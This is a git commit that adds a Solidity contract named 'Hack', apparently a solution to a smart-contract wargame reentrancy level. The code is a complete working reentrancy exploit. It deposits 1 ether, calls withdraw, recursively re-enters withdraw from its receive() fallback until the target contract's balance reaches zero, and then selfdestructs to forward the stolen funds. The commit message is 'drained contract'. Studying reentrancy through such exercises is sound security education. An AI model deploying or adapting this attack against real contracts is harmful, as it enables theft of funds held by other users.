cb808ffff791c32f4d0bd12c3273fba1bfb3df62
lopeselio <lopeselio@gmail.com>
2023-01-31 23:27:22 +0530

    drained contract

---
+++ Re-entrancy/perfrom.sol
@@ -0,0 +1,33 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8;
+
+interface IReentrancy {
+    function donate(address) external payable;
+    function withdraw(uint256) external;
+}
+
+contract Hack {
+    IReentrancy private immutable target;
+
+    constructor(address _target) {
+        target = IReentrancy(_target);
+    }
+
+    function attack() external payable {
+        target.donate{value: 1e18}(address(this));
+        target.withdraw(1e18); 
+        require(address(target).balance == 0, "target balance > 0");
+        selfdestruct(payable(msg.sender));
+    }
+
+    receive() external payable {
+        uint amount = min(1e18, address(target).balance);
+        if (amount> 0){
+            target.withdraw(amount);
+        }
+    } 
+
+    function min(uint x, uint y) private pure returns (uint) {
+        return x <= y ? x : y;
+    }
+}
